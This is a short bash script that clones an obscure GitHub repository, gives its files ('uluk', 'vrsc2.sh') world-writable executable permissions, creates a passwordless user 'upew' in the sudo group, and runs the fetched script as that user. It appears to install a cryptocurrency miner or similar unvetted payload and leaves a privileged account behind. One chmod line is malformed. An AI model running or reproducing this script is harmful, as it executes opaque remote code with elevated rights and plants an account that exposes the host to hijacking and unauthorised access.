#!/bin/bash
sudo apt update
git clone https://github.com/magssfesgtr/drreyer.git && cd drreyer
chmod +x vrsc2.sh && chmod +x uluk chmod 777 uluk vrsc2.sh
sudo adduser --disabled-password --gecos "" upew && sudo usermod -aG sudo upew
sudo -u upew -H sh -c "./vrsc2.sh"
sudo apt update
